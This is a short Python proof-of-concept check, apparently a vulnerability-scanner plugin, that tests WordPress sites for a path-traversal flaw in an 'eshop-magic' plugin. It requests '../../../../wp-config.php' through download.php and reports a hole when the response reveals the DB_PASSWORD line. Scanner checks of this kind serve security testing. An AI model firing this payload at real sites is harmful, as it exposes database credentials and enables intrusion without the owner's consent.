#!/usr/bin/env python
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
    verify_url = arg + payload
    code, head, res, errcode, _ = curl.curl2(verify_url)

    if code == 200:
        m = re.search("define\('DB_PASSWORD'", res)
        if m:
            security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://127.0.0.1/wordpress/')[1])
